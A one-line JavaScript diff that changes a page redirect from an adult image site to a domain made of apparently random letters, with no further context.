@@ -1,1 +1,1 @@
-window.location.href = "https://www.hypnohub.com";
+window.location.href = "https://www.fniesabfoas.com";
